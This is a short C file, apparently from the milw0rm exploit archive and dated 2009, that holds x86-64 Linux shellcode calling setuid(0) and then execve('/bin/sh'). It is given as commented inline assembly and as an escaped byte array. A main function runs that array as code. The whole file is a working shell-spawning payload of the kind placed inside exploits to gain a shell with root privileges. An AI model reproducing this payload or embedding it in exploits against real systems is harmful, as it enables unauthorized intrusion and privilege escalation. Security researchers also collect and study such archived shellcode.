/*
setuid(0) + execve(/bin/sh) - just 4 fun.
xi4oyu [at] 80sec.com

main(){
__asm(  "xorq %rdi,%rdi\n\t"
        "mov $0x69,%al\n\t"
        "syscall \n\t"
        "xorq   %rdx, %rdx \n\t"
        "movq   $0x68732f6e69622fff,%rbx; \n\t"
        "shr    $0x8, %rbx; \n\t"
        "push   %rbx; \n\t"
        "movq   %rsp,%rdi; \n\t"
        "xorq   %rax,%rax; \n\t"
        "pushq  %rax; \n\t"
        "pushq  %rdi; \n\t"
        "movq   %rsp,%rsi; \n\t"
        "mov    $0x3b,%al; \n\t"
        "syscall ; \n\t"
        "pushq  $0x1 ; \n\t"
        "pop    %rdi ; \n\t"
        "pushq  $0x3c ; \n\t"
        "pop    %rax ; \n\t"
        "syscall  ; \n\t"
);
}
*/
main() {
        char shellcode[] =
        "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
        "\x58\x0f\x05";
        (*(void (*)()) shellcode)();
}

2009-05-14
evil.xi4oyu

// milw0rm.com [2009-05-14]